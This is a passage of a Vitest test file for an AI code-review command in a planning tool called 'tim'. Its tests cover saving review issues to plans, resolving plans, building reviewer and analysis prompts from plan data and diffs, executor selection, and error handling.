import { vi, expect, test, beforeEach, afterEach, describe } from 'vitest';
import { mkdtemp, writeFile, mkdir } from 'node:fs/promises';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import {
  handleReviewCommand,
  buildAnalysisPrompt,
  buildReviewPrompt,
  getReviewGuidePath,
  detectIssuesInReview,
  buildAutofixPrompt,
  reopenParentForAppendedReviewTasks,
  sanitizeBranchName,
  validateFocusAreas,
  resolveReviewTaskScope,
  saveReviewIssuesToPlan,
  clearSavedReviewIssues,
} from './review.js';
import { validateInstructionsFilePath } from '../utils/file_validation.js';
import { generateDiffForReview } from '../incremental_review.js';
import type { PlanSchema } from '../planSchema.js';
import type { PlanWithFilename } from '../utils/hierarchy.js';
import { readPlanFile, resolvePlanFromDb, writePlanFile, writePlanToDb } from '../plans.js';
import { closeDatabaseForTesting } from '../db/database.js';
import { clearPlanSyncContext } from '../db/plan_sync.js';
import { clearAllTimCaches } from '../../testing.js';
import * as notificationsModule from '../notifications.js';
import * as executorsModule from '../executors/index.js';
import * as configLoaderModule from '../configLoader.js';
import * as contextGatheringModule from '../utils/context_gathering.js';
import * as inputModule from '../../common/input.js';
import * as gitModule from '../../common/git.js';
import * as agentPromptsModule from '../executors/claude_code/agent_prompts.js';
import * as inquirerModule from '@inquirer/prompts';
import * as loggingModule from '../../logging.js';

vi.mock('../notifications.js', () => ({
  sendNotification: vi.fn(),
}));

vi.mock('../executors/index.js', () => ({
  buildExecutorAndLog: vi.fn(),
  DEFAULT_EXECUTOR: 'codex-cli',
}));

vi.mock('../configLoader.js', async (importOriginal) => {
  const actual = await importOriginal<typeof configLoaderModule>();
  return {
    ...actual,
    loadEffectiveConfig: vi.fn(),
  };
});

vi.mock('../utils/context_gathering.js', () => ({
  gatherPlanContext: vi.fn(),
}));

vi.mock('../../common/input.js', () => ({
  promptSelect: vi.fn(),
  promptCheckbox: vi.fn(),
}));

vi.mock('../../common/git.js', async (importOriginal) => {
  const actual = await importOriginal<typeof gitModule>();
  return {
    ...actual,
    getGitRoot: vi.fn(),
    getTrunkBranch: vi.fn(),
    getUsingJj: vi.fn(),
    getCurrentCommitHash: vi.fn(),
    getCurrentBranchName: vi.fn(),
  };
});

vi.mock('../executors/claude_code/agent_prompts.js', () => ({
  getReviewerPrompt: vi.fn(),
}));

vi.mock('@inquirer/prompts', () => ({
  confirm: vi.fn(),
  checkbox: vi.fn(),
  select: vi.fn(),
}));

vi.mock('../../logging.js', async (importOriginal) => {
  const actual = await importOriginal<typeof loggingModule>();
  return {
    ...actual,
    log: vi.fn(),
    warn: vi.fn(),
    error: vi.fn(),
  };
});

let testDir: string;
let sendNotificationSpy: ReturnType<typeof vi.fn>;
let originalCwd: string;
let originalXdgConfigHome: string | undefined;
let originalTimInteractive: string | undefined;
let promptSelectSpy: ReturnType<typeof vi.fn>;
let promptCheckboxSpy: ReturnType<typeof vi.fn>;

function createMockPlanContext(overrides: Record<string, unknown> = {}) {
  return {
    repoRoot: testDir,
    gitRoot: testDir,
    ...overrides,
  };
}

beforeEach(async () => {
  clearAllTimCaches();
  closeDatabaseForTesting();
  clearPlanSyncContext();
  originalCwd = process.cwd();
  originalXdgConfigHome = process.env.XDG_CONFIG_HOME;
  originalTimInteractive = process.env.TIM_INTERACTIVE;
  testDir = await mkdtemp(join(tmpdir(), 'tim-review-test-'));
  await Bun.$`git init`.cwd(testDir).quiet();
  await Bun.$`git remote add origin https://example.com/acme/review-tests.git`.cwd(testDir).quiet();
  process.env.XDG_CONFIG_HOME = join(testDir, 'config');
  process.env.TIM_INTERACTIVE = '1';
  vi.spyOn(console, 'error').mockImplementation(() => {});

  sendNotificationSpy = vi.mocked(notificationsModule.sendNotification);
  sendNotificationSpy.mockResolvedValue(true);
  promptSelectSpy = vi.mocked(inputModule.promptSelect);
  promptCheckboxSpy = vi.mocked(inputModule.promptCheckbox);
  promptSelectSpy.mockResolvedValue('exit-manually-resolved' as any);
  promptCheckboxSpy.mockResolvedValue([] as any);

  vi.mocked(gitModule.getGitRoot).mockResolvedValue(testDir);
});

afterEach(async () => {
  clearAllTimCaches();
  closeDatabaseForTesting();
  clearPlanSyncContext();
  process.chdir(originalCwd);
  if (originalXdgConfigHome === undefined) {
    delete process.env.XDG_CONFIG_HOME;
  } else {
    process.env.XDG_CONFIG_HOME = originalXdgConfigHome;
  }
  if (originalTimInteractive === undefined) {
    delete process.env.TIM_INTERACTIVE;
  } else {
    process.env.TIM_INTERACTIVE = originalTimInteractive;
  }
  vi.clearAllMocks();
});

describe('review issue persistence helpers', () => {
  test('saveReviewIssuesToPlan persists issues to the plan file', async () => {
    const planFile = join(testDir, 'review-issues.plan.md');
    await writePlanFile(planFile, {
      id: 1,
      title: 'Persist review issues',
      goal: 'Verify saved issues round-trip',
      details: 'Details',
      tasks: [],
    });

    const issues = [
      {
        id: 'issue-1',
        severity: 'major' as const,
        category: 'bug' as const,
        content: 'A saved issue',
        file: 'src/example.ts',
        line: 12,
        suggestion: 'Add a guard clause',
      },
      {
        id: 'issue-2',
        severity: 'minor' as const,
        category: 'testing' as const,
        content: 'Add a regression test',
        line: '24-30',
      },
    ];

    await saveReviewIssuesToPlan(planFile, issues);

    const updatedPlan = await readPlanFile(planFile);
    expect(updatedPlan.reviewIssues).toEqual(issues);
  });

  test('clearSavedReviewIssues removes saved issues and is a no-op when absent', async () => {
    const configPath = join(testDir, '.tim.yml');
    await writeFile(configPath, 'review: {}\n');
    await writePlanToDb(
      {
        id: 2,
        title: 'Clear review issues',
        goal: 'Verify saved issues can be removed',
        details: 'Details',
        tasks: [],
        reviewIssues: [
          {
            id: 'issue-1',
            severity: 'critical',
            category: 'security',
            content: 'A critical issue',
          },
        ],
      },
      { cwdForIdentity: testDir }
    );

    await clearSavedReviewIssues('2', configPath);
    await clearSavedReviewIssues('2', configPath);

    const updatedPlan = (await resolvePlanFromDb('2', testDir)).plan;
    expect(updatedPlan.reviewIssues).toBeUndefined();
  });
});

test('saveReviewIssuesToPlan persists only the selected review issues', async () => {
  const configPath = join(testDir, '.tim.yml');
  await writeFile(configPath, 'review: {}\n');
  await writePlanToDb(
    {
      id: 10,
      title: 'Save selected review issues',
      goal: 'Only persist the issues the user selected',
      details: 'Details',
      tasks: [],
    },
    { cwdForIdentity: testDir }
  );

  const reviewIssues = [
    {
      id: 'issue-1',
      severity: 'critical' as const,
      category: 'security' as const,
      content: 'Critical security issue',
      file: 'src/security.ts',
      line: 12,
    },
    {
      id: 'issue-2',
      severity: 'minor' as const,
      category: 'testing' as const,
      content: 'Missing regression test',
      file: 'src/security.test.ts',
      line: 44,
    },
  ];

  await saveReviewIssuesToPlan('10', [reviewIssues[0]], configPath);

  const updatedPlan = (await resolvePlanFromDb('10', testDir)).plan;
  expect(updatedPlan.reviewIssues).toEqual([reviewIssues[0]]);
});

test('handleReviewCommand resolves plan by file path', async () => {
  // Create a test plan file
  const planContent = `
id: 1
title: Test Plan
goal: Test the review functionality
details: This is a test plan for the review command
tasks:
  - title: Test task
    description: A test task
    steps:
      - prompt: Do something
        done: false
`;

  const planFile = join(testDir, 'test-plan.yml');
  await writeFile(planFile, `---\n${planContent}---\n`);

  // Mock the buildExecutorAndLog and other dependencies
  vi.mocked(executorsModule.buildExecutorAndLog).mockReturnValue({
    execute: vi.fn(async () =>
      JSON.stringify({
        issues: [],
        recommendations: [],
        actionItems: [],
      })
    ),
  } as any);

  vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({
    defaultExecutor: 'codex-cli',
  } as any);

  vi.mocked(contextGatheringModule.gatherPlanContext).mockResolvedValue(
    createMockPlanContext({
      resolvedPlanFile: planFile,
      planData: {
        id: 1,
        title: 'Test Plan',
        goal: 'Test the review functionality',
        details: 'This is a test plan for the review command',
        tasks: [
          {
            title: 'Test task',
            description: 'A test task',
            steps: [
              {
                prompt: 'Do something',
                done: false,
              },
            ],
          },
        ],
      },
      parentChain: [],
      completedChildren: [],
      diffResult: {
        hasChanges: true,
        changedFiles: ['test.ts'],
        baseBranch: 'main',
        diffContent: 'mock diff',
      },
      incrementalSummary: null,
      noChangesDetected: false,
    }) as any
  );

  vi.mocked(gitModule.getGitRoot).mockResolvedValue(testDir);
  vi.mocked(gitModule.getTrunkBranch).mockResolvedValue('main');
  vi.mocked(gitModule.getUsingJj).mockResolvedValue(false);
  vi.mocked(agentPromptsModule.getReviewerPrompt).mockReturnValue({
    prompt: 'mock reviewer prompt',
  } as any);

  // Test resolving plan by file path
  const mockCommand = {
    parent: {
      opts: () => ({}),
    },
  };

  await handleReviewCommand(planFile, {}, mockCommand);
});

test('handleReviewCommand resolves plan by ID', async () => {
  await writePlanToDb(
    {
      id: 42,
      title: 'Test Plan with ID',
      goal: 'Test plan resolution by ID',
      details: 'This plan should be resolvable by its ID',
      tasks: [
        {
          title: 'Test task',
          description: 'A test task',
        },
      ],
    },
    { cwdForIdentity: testDir }
  );

  const gatherPlanContextMock = vi.fn(async (planArg: string) => {
    expect(planArg).toBe('42');
    return createMockPlanContext({
      resolvedPlanFile: '42',
      planData: {
        id: 42,
        title: 'Test Plan with ID',
        goal: 'Test plan resolution by ID',
        details: 'This plan should be resolvable by its ID',
        tasks: [
          {
            title: 'Test task',
            description: 'A test task',
          },
        ],
      },
      parentChain: [],
      completedChildren: [],
      diffResult: {
        hasChanges: true,
        changedFiles: ['test.ts'],
        baseBranch: 'main',
        diffContent: 'mock diff',
      },
    });
  });

  // Mock dependencies
  vi.mocked(executorsModule.buildExecutorAndLog).mockReturnValue({
    execute: vi.fn(async () =>
      JSON.stringify({
        issues: [],
        recommendations: [],
        actionItems: [],
      })
    ),
  } as any);

  vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({
    defaultExecutor: 'codex-cli',
  } as any);

  vi.mocked(contextGatheringModule.gatherPlanContext).mockImplementation(gatherPlanContextMock);

  vi.mocked(gitModule.getGitRoot).mockResolvedValue(testDir);
  vi.mocked(gitModule.getTrunkBranch).mockResolvedValue('main');
  vi.mocked(gitModule.getUsingJj).mockResolvedValue(false);

  // Test resolving plan by ID
  const mockCommand = {
    parent: {
      opts: () => ({}),
    },
  };

  await handleReviewCommand('42', {}, mockCommand);
  expect(gatherPlanContextMock).toHaveBeenCalledTimes(1);
});

test('uses review default executor from config when no executor option passed', async () => {
  await writePlanToDb(
    {
      id: 1,
      title: 'Review Executor Test',
      goal: 'Use review default executor',
      tasks: [
        {
          title: 'Task',
          description: 'Review task',
        },
      ],
    },
    { cwdForIdentity: testDir }
  );

  const mockExecutor = {
    execute: vi.fn(async () =>
      JSON.stringify({
        issues: [],
        recommendations: [],
        actionItems: [],
      })
    ),
  };

  vi.mocked(contextGatheringModule.gatherPlanContext).mockResolvedValue(
    createMockPlanContext({
      resolvedPlanFile: 'plan.yml',
      planData: {
        id: 1,
        title: 'Review Executor Test',
        goal: 'Use review default executor',
        tasks: [
          {
            title: 'Task',
            description: 'Review task',
          },
        ],
      },
      parentChain: [],
      completedChildren: [],
      diffResult: {
        hasChanges: true,
        changedFiles: ['src/test.ts'],
        baseBranch: 'main',
        diffContent: 'diff',
      },
    }) as any
  );

  vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({
    defaultExecutor: 'codex-cli',
    review: {
      defaultExecutor: 'codex-cli',
    },
  } as any);

  vi.mocked(executorsModule.buildExecutorAndLog).mockImplementation((executorName: string) => {
    expect(executorName).toBe('codex-cli');
    return mockExecutor as any;
  });

  vi.mocked(agentPromptsModule.getReviewerPrompt).mockReturnValue({
    prompt: 'mock review prompt',
  } as any);

  vi.mocked(gitModule.getGitRoot).mockResolvedValue(testDir);
  vi.mocked(gitModule.getCurrentCommitHash).mockResolvedValue('hash');
  vi.mocked(gitModule.getTrunkBranch).mockResolvedValue('main');
  vi.mocked(gitModule.getUsingJj).mockResolvedValue(false);

  const mockCommand = {
    parent: {
      opts: () => ({}),
    },
  };

  await handleReviewCommand('plan.yml', { noSave: true }, mockCommand);

  expect(mockExecutor.execute).toHaveBeenCalledTimes(1);
});

describe('generateDiffForReview', () => {
  test('function exists and can be called', async () => {
    // Since mocking the Bun $ utility is complex in tests, we'll test that the function
    // exists and has the expected interface, then test the full functionality in integration tests
    const gitRepoDir = await mkdtemp(join(tmpdir(), 'tim-git-test-'));

    // Mock git utilities to avoid actual git calls
    vi.mocked(gitModule.getTrunkBranch).mockResolvedValue('main');
    vi.mocked(gitModule.getUsingJj).mockResolvedValue(false);

    // Test that the function exists and has the expected structure
    expect(typeof generateDiffForReview).toBe('function');

    // The function should handle the case when git commands fail gracefully
    try {
      await generateDiffForReview(gitRepoDir);
    } catch (error) {
      // Should throw a meaningful error if git commands fail
      expect(error.message).toContain('Failed to generate');
    }
  });

  test('function interface with jj', async () => {
    const jjRepoDir = await mkdtemp(join(tmpdir(), 'tim-jj-test-'));

    vi.mocked(gitModule.getTrunkBranch).mockResolvedValue('main');
    vi.mocked(gitModule.getUsingJj).mockResolvedValue(true);

    // Test that the function exists and handles jj mode
    expect(typeof generateDiffForReview).toBe('function');

    try {
      await generateDiffForReview(jjRepoDir);
    } catch (error) {
      // Should throw a meaningful error if jj commands fail
      expect(error.message).toContain('Failed to generate');
    }
  });

  test('incremental mode without history avoids console stdout logging', async () => {
    const gitRepoDir = await mkdtemp(join(tmpdir(), 'tim-git-test-'));

    vi.mocked(gitModule.getTrunkBranch).mockResolvedValue('main');
    vi.mocked(gitModule.getUsingJj).mockResolvedValue(false);

    const logSpy = vi.spyOn(console, 'log').mockImplementation(() => {});

    try {
      await generateDiffForReview(gitRepoDir, { incremental: true, planId: '123' });
    } catch (error) {
      expect(error.message).toContain('Failed to generate');
    } finally {
      logSpy.mockRestore();
    }

    expect(logSpy).not.toHaveBeenCalled();
  });
});

describe('buildReviewPrompt', () => {
  test('includes plan context and diff content', async () => {
    const planData: PlanSchema = {
      id: 42,
      title: 'Test Feature Implementation',
      goal: 'Implement a new test feature for the application',
      details: 'This feature should handle user authentication and data validation',
      tasks: [
        {
          title: 'Add authentication',
          description: 'Implement user login/logout functionality',
          done: false,
        },
        {
          title: 'Add data validation',
          description: 'Validate user input',
          done: false,
        },
      ],
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['src/auth.ts', 'src/validation.ts'],
      baseBranch: 'main',
      diffContent: `diff --git a/src/auth.ts b/src/auth.ts
index 1234567..abcdefg 100644
--- a/src/auth.ts
+++ b/src/auth.ts
@@ -1,3 +1,6 @@
 export class Auth {
+  login(user: string) {
+    return true;
+  }
 }`,
    };

    // Mock the reviewer prompt
    vi.mocked(agentPromptsModule.getReviewerPrompt).mockImplementation(
      (contextContent: string) =>
        ({
          name: 'reviewer',
          description: 'Reviews code',
          prompt: `REVIEWER AGENT\n\n${contextContent}\n\nPLEASE REVIEW THE CODE`,
        }) as any
    );

    const prompt = buildReviewPrompt(planData, diffResult, true, false, [], []);

    // Verify plan context is included
    expect(prompt).toContain('Plan ID:** 42');
    expect(prompt).toContain('Title:** Test Feature Implementation');
    expect(prompt).toContain('Goal:** Implement a new test feature');
    expect(prompt).toContain('Details:**');
    expect(prompt).toContain('This feature should handle user authentication');

    // Verify tasks are included
    expect(prompt).toContain('Tasks:**');
    expect(prompt).toContain('1. **Add authentication**');
    expect(prompt).toContain('Implement user login/logout functionality');
    expect(prompt).toContain('2. **Add data validation**');

    // Verify diff content is included
    expect(prompt).toContain('Diff Base:** main');
    expect(prompt).toContain('Changed Files (2):**');
    expect(prompt).toContain('- src/auth.ts');
    expect(prompt).toContain('- src/validation.ts');
    expect(prompt).toContain('diff --git a/src/auth.ts');
    expect(prompt).toContain('+  login(user: string)');

    // Verify review instructions are included
    expect(prompt).toContain('Review Instructions');
    expect(prompt).toContain('Compliance with Plan Requirements');
    expect(prompt).toContain('Code Quality');
    expect(prompt).toContain('REVIEWER AGENT');
  });

  test('includes previous review response when provided', async () => {
    const planData: PlanSchema = {
      id: 7,
      title: 'Previous Review Response Test',
      goal: 'Ensure previous review response is included',
      tasks: [],
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['src/example.ts'],
      baseBranch: 'main',
      diffContent: 'diff --git a/src/example.ts b/src/example.ts',
    };

    vi.mocked(agentPromptsModule.getReviewerPrompt).mockImplementation(
      (contextContent: string) =>
        ({
          name: 'reviewer',
          description: 'Reviews code',
          prompt: contextContent,
        }) as any
    );

    const prompt = buildReviewPrompt(
      planData,
      diffResult,
      false,
      false,
      [],
      [],
      undefined,
      undefined,
      undefined,
      undefined,
      'Resolved the missing edge cases in the last review.'
    );

    expect(prompt).toContain('Previous Review Response');
    expect(prompt).toContain('Resolved the missing edge cases in the last review.');
  });

  test('includes review scope note when provided', async () => {
    const planData: PlanSchema = {
      id: 7,
      title: 'Scoped Review Plan',
      goal: 'Check scope note',
      tasks: [{ title: 'Task One', description: 'Only task', done: false }],
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['src/file.ts'],
      baseBranch: 'main',
      diffContent: 'diff --git',
    };

    vi.mocked(agentPromptsModule.getReviewerPrompt).mockImplementation(
      (contextContent: string) =>
        ({
          prompt: contextContent,
        }) as any
    );

    const prompt = buildReviewPrompt(
      planData,
      diffResult,
      false,
      false,
      [],
      [],
      undefined,
      'Scoped to selected tasks.'
    );

    expect(prompt).toContain('**Review Scope:** Scoped to selected tasks.');
  });

  test('includes review guide instructions when provided', async () => {
    const planData: PlanSchema = {
      id: 55,
      title: 'Guide-Aware Review',
      goal: 'Use the guide',
      tasks: [],
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['src/file.ts'],
      baseBranch: 'main',
      diffContent: 'diff --git',
    };

    vi.mocked(agentPromptsModule.getReviewerPrompt).mockImplementation(
      (contextContent: string) =>
        ({
          prompt: contextContent,
        }) as any
    );

    const prompt = buildReviewPrompt(
      planData,
      diffResult,
      false,
      false,
      [],
      [],
      undefined,
      undefined,
      undefined,
      undefined,
      undefined,
      '.tim/tmp/review-guide-55.md'
    );

    expect(prompt).toContain('# Review Guide');
    expect(prompt).toContain('`.tim/tmp/review-guide-55.md`');
    expect(prompt).toContain('organizational framework');
  });

  test('builds deterministic review guide path', () => {
    expect(getReviewGuidePath(123)).toBe(join('.tim', 'tmp', 'review-guide-123.md'));
  });

  test('buildReviewPrompt omits review guide section when no guide path is provided', () => {
    const planData: PlanSchema = {
      id: 12,
      title: 'Review without guide',
      goal: 'Verify legacy prompt behavior',
      tasks: [],
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['src/example.ts'],
      baseBranch: 'main',
      diffContent: 'diff --git',
    };

    vi.mocked(agentPromptsModule.getReviewerPrompt).mockImplementation(
      (contextContent: string) =>
        ({
          prompt: contextContent,
        }) as any
    );

    const prompt = buildReviewPrompt(planData, diffResult);

    expect(prompt).not.toContain('# Review Guide');
    expect(prompt).not.toContain('organizational framework');
    expect(prompt).toContain('# Review Instructions');
  });

  test('builds analysis prompt for jj repositories', async () => {
    vi.mocked(gitModule.getUsingJj).mockResolvedValue(true);

    const planData: PlanSchema = {
      id: 308,
      title: 'Improve review agent',
      goal: 'Produce a useful guide',
      details: 'Review agent details',
      tasks: [{ title: 'Analyze review flow', description: 'Inspect it', done: false }],
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['src/tim/review_runner.ts', 'src/tim/commands/review.ts'],
      baseBranch: 'main',
      diffContent: 'diff --git',
    };

    const parentChain: PlanSchema[] = [
      {
        id: 101,
        title: 'Parent review work',
        goal: 'Coordinate review improvements',
        details: 'Parent details',
        tasks: [],
      },
    ];
    const completedChildren: PlanSchema[] = [
      {
        id: 102,
        title: 'Finished child work',
        goal: 'Land supporting changes',
        details: 'Child details',
        tasks: [],
      },
    ];

    const prompt = await buildAnalysisPrompt(
      planData,
      diffResult,
      '/repo/root',
      parentChain,
      completedChildren,
      'Scoped to current review tasks.',
      [{ index: 3, title: 'Update tests' }]
    );

    expect(prompt).toContain('use parallel subagents');
    expect(prompt).toContain("jj diff -f 'heads(::@ & ::main)' <filename>");
    expect(prompt).toContain('Ignore comments starting with `AI:` or `AI_COMMENT_START`');
    expect(prompt).toContain('`.tim/tmp/review-guide-308.md`');
    expect(prompt).toContain('`/repo/root/.tim/tmp/review-guide-308.md`');
    expect(prompt).toContain('# Parent Plan Context');
    expect(prompt).toContain('**Parent Plan ID:** 101');
    expect(prompt).toContain('# Completed Child Plans');
    expect(prompt).toContain('**Child Plan ID:** 102');
    expect(prompt).toContain('**Changed Files (2):**');
    expect(prompt).toContain('- src/tim/review_runner.ts');
    expect(prompt).toContain('Review Scope:** Scoped to current review tasks.');
    expect(prompt).toContain('Remaining Unfinished Tasks');
  });

  test('builds analysis prompt for git repositories', async () => {
    vi.mocked(gitModule.getUsingJj).mockResolvedValue(false);

    const planData: PlanSchema = {
      id: 99,
      title: 'Git review',
      goal: 'Use git diff',
      tasks: [],
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['src/file.ts'],
      baseBranch: 'develop',
      diffContent: 'diff --git',
    };

    const prompt = await buildAnalysisPrompt(planData, diffResult, '/repo/root');

    expect(prompt).toContain('git diff $(git merge-base develop HEAD) -- <filename>');
  });

  test('passes useSubagents flag to reviewer prompt', async () => {
    const planData: PlanSchema = {
      id: 99,
      title: 'Subagent Plan',
      goal: 'Check subagent usage',
      tasks: [],
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['src/file.ts'],
      baseBranch: 'main',
      diffContent: 'diff --git',
    };

    const reviewerSpy = vi.fn(() => ({ prompt: 'mock prompt' }));
    vi.mocked(agentPromptsModule.getReviewerPrompt).mockImplementation(reviewerSpy);

    buildReviewPrompt(planData, diffResult, false, true, [], []);

    expect(reviewerSpy).toHaveBeenCalledTimes(1);
    expect(reviewerSpy).toHaveBeenCalledWith(
      expect.any(String),
      planData.id,
      undefined,
      undefined,
      true
    );
  });

  test('handles plan without tasks', async () => {
    const planData: PlanSchema = {
      id: 1,
      title: 'Simple Plan',
      goal: 'A simple goal',
      tasks: [],
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['src/simple.ts'],
      baseBranch: 'main',
      diffContent: 'diff content here',
    };

    vi.mocked(agentPromptsModule.getReviewerPrompt).mockImplementation(
      (contextContent: string) =>
        ({
          prompt: contextContent,
        }) as any
    );

    const prompt = buildReviewPrompt(planData, diffResult, true, false, [], []);

    expect(prompt).toContain('Plan ID:** 1');
    expect(prompt).toContain('Title:** Simple Plan');
    expect(prompt).toContain('Goal:** A simple goal');
    expect(prompt).not.toContain('Details:**');
    expect(prompt).toContain('src/simple.ts');
  });

  test('handles plan without details', async () => {
    const planData: PlanSchema = {
      id: 2,
      title: 'Plan Without Details',
      goal: 'Test goal',
      tasks: [
        {
          title: 'Task 1',
          description: 'Description 1',
          steps: [],
        },
      ],
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['test.ts'],
      baseBranch: 'master',
      diffContent: 'test diff',
    };

    vi.mocked(agentPromptsModule.getReviewerPrompt).mockImplementation(
      (contextContent: string) =>
        ({
          prompt: contextContent,
        }) as any
    );

    const prompt = buildReviewPrompt(planData, diffResult, true, false, [], []);

    expect(prompt).toContain('Plan ID:** 2');
    expect(prompt).toContain('Title:** Plan Without Details');
    expect(prompt).toContain('Goal:** Test goal');
    expect(prompt).not.toContain('Details:**');
    expect(prompt).toContain('1. **Task 1**');
    expect(prompt).toContain('Description 1');
    expect(prompt).toContain('Diff Base:** master');
  });

  test('uses originalIndex for task numbering when tasks have originalIndex', async () => {
    // Tasks with originalIndex simulate filtered/scoped tasks
    const planData: PlanSchema = {
      id: 10,
      title: 'Scoped Review Plan',
      goal: 'Test original index display',
      tasks: [
        { title: 'Task Two', description: 'Second task', done: false, originalIndex: 2 } as any,
        { title: 'Task Five', description: 'Fifth task', done: true, originalIndex: 5 } as any,
      ],
    };

    const diffResult: DiffResult = {
      diffContent: 'test diff',
      changedFiles: ['file1.ts'],
      baseBranch: 'main',
    };

    vi.mocked(agentPromptsModule.getReviewerPrompt).mockImplementation(
      (contextContent: string) =>
        ({
          prompt: contextContent,
        }) as any
    );

    const prompt = buildReviewPrompt(planData, diffResult, false, false, [], []);

    // Should use original indexes (2 and 5), not array indexes (1 and 2)
    expect(prompt).toContain('2. **Task Two**');
    expect(prompt).toContain('5. **Task Five**');
    expect(prompt).not.toContain('1. **Task Two**');
    expect(prompt).not.toContain('2. **Task Five**');
  });
});

describe('handleReviewCommand error handling', () => {
  test('throws error when plan cannot be loaded', async () => {
    const invalidPlanFile = join(testDir, 'invalid.yml');

    vi.mocked(contextGatheringModule.gatherPlanContext).mockRejectedValue(
      new Error('Plan file not found: ' + invalidPlanFile)
    );

    vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({} as any);

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    await expect(handleReviewCommand(invalidPlanFile, {}, mockCommand)).rejects.toThrow(
      'Plan file not found'
    );
  });

  test('exits early when no changes detected', async () => {
    const planFile = join(testDir, 'no-changes.yml');

    vi.mocked(contextGatheringModule.gatherPlanContext).mockResolvedValue(
      createMockPlanContext({
        resolvedPlanFile: planFile,
        planData: {
          id: 1,
          title: 'Test Plan',
          goal: 'Test goal',
          tasks: [
            {
              title: 'Test task',
              description: 'A test task',
            },
          ],
        },
        parentChain: [],
        completedChildren: [],
        diffResult: {
          hasChanges: false,
          changedFiles: [],
          baseBranch: 'main',
          diffContent: '',
        },
        incrementalSummary: null,
        noChangesDetected: true,
      }) as any
    );

    vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({} as any);

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    // Should complete without error but not call executor
    await expect(handleReviewCommand(planFile, {}, mockCommand)).resolves.toEqual({
      tasksAppended: 0,
    });
  });

  test('handles executor execution failure', async () => {
    const planFile = join(testDir, 'executor-fail.yml');
    await writePlanToDb(
      {
        id: 126,
        title: 'Test No Issues',
        goal: 'Test goal',
        tasks: [
          {
            title: 'Test task',
            description: 'A test task',
          },
        ],
      },
      { cwdForIdentity: testDir }
    );

    const mockExecutor = {
      execute: vi.fn(async () => {
        throw new Error('Executor failed');
      }),
    };

    vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({
      defaultExecutor: 'codex-cli',
    } as any);

    vi.mocked(executorsModule.buildExecutorAndLog).mockReturnValue(mockExecutor as any);

    vi.mocked(gitModule.getGitRoot).mockResolvedValue(testDir);
    vi.mocked(gitModule.getCurrentCommitHash).mockResolvedValue('deadbeef');

    // Avoid real context gathering that would hit git/FS
    vi.mocked(contextGatheringModule.gatherPlanContext).mockResolvedValue(
      createMockPlanContext({
        resolvedPlanFile: planFile,
        planData: {
          id: 126,
          title: 'Test No Issues',
          goal: 'Test goal',
          tasks: [
            {
              title: 'Test task',
              description: 'A test task',
            },
          ],
        },
        parentChain: [],
        completedChildren: [],
        diffResult: {
          hasChanges: true,
          changedFiles: ['src/test.ts'],
          baseBranch: 'main',
          diffContent: 'mock diff content',
        },
        incrementalSummary: null,
        noChangesDetected: false,
      }) as any
    );

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    await expect(handleReviewCommand(planFile, {}, mockCommand)).rejects.toThrow(
      'Review execution failed'
    );
  });
});

describe('integration with executor system', () => {
  test('passes correct parameters to executor', async () => {
    const planContent = `
id: 123
title: Integration Test Plan
goal: Test executor integration
tasks:
  - title: Test task
    description: Integration test task
`;
    const planFile = join(testDir, 'integration.yml');
    await writeFile(planFile, `---\n${planContent}---\n`);

    const mockExecutor = {
      execute: vi.fn(async (prompt: string, metadata: any) => {
        expect(prompt).toContain('REVIEWER AGENT');
        // expect(metadata.planId).toBe('123');
        expect(metadata.planTitle).toBe('Integration Test Plan');
        // expect(metadata.planFilePath).toBe(planFile);
        return JSON.stringify({
          issues: [],
          recommendations: [],
          actionItems: [],
        });
      }),
    };

    vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({
      defaultExecutor: 'claude-code',
    } as any);

    vi.mocked(contextGatheringModule.gatherPlanContext).mockResolvedValue(
      createMockPlanContext({
        resolvedPlanFile: planFile,
        planData: {
          id: 123,
          title: 'Integration Test Plan',
          goal: 'Test executor integration',
          tasks: [
            {
              title: 'Test task',
              description: 'Integration test task',
            },
          ],
        },
        parentChain: [],
        completedChildren: [],
        diffResult: {
          hasChanges: true,
          changedFiles: ['src/test.ts'],
          baseBranch: 'main',
          diffContent: 'test diff content',
        },
        incrementalSummary: null,
        noChangesDetected: false,
      }) as any
    );

    vi.mocked(executorsModule.buildExecutorAndLog).mockImplementation(
      (executorName: string, options: any) => {
        expect(executorName).toBe('claude-code');
        expect(options.baseDir).toBe(testDir);
        return mockExecutor as any;
      }
    );

    vi.mocked(agentPromptsModule.getReviewerPrompt).mockImplementation(
      (contextContent: string) =>
        ({
          prompt: `REVIEWER AGENT\n\n${contextContent}`,
        }) as any
    );

    vi.mocked(gitModule.getGitRoot).mockResolvedValue(testDir);
    vi.mocked(gitModule.getCurrentBranchName).mockResolvedValue(null);

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    await handleReviewCommand(planFile, { executor: 'claude-code' }, mockCommand);

    expect(mockExecutor.execute).toHaveBeenCalledTimes(1);
  });

  test('passes executionMode review to executor for review-only operation', async () => {
    const planContent = `
id: 123
title: Test Review Execution
goal: Test that review command uses review execution mode
tasks:
  - title: Test task
    description: A test task for review execution mode
`;
    const planFile = join(testDir, 'review-execution.yml');
    await writeFile(planFile, `---\n${planContent}---\n`);

    const mockExecutor = {
      execute: vi.fn(async (prompt: string, planInfo: any) => {
        // Verify that executionMode is set to 'review'
        expect(planInfo.executionMode).toBe('review');
        expect(planInfo.planId).toBe('123');
        expect(planInfo.planTitle).toBe('Test Review Execution');
